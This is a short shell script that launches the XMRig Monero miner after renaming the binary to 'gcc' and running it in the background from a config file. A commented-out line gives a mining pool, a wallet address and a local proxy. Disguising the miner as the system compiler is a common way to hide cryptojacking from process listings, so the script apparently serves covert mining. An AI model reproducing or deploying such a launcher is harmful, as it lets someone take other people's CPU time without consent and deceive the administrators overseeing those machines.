cd xmrs
chmod +x xmrig
mv xmrig gcc
core=`nproc --all`
#./gcc --coin monero -o pool.supportxmr.com:5555 -u 44eQMzxNprjVmCMxwhTfPs5z6ixY4pDTT67PV4sr1iWj7Tbx8UjE9RGCygXKKyUv7pLMdX5C5wTc5ckMGvaLwTPx3k5ELYX -p x -k --threads=22  --proxy=127.0.0.1:1080
./gcc --config=./config.json -t 8 &
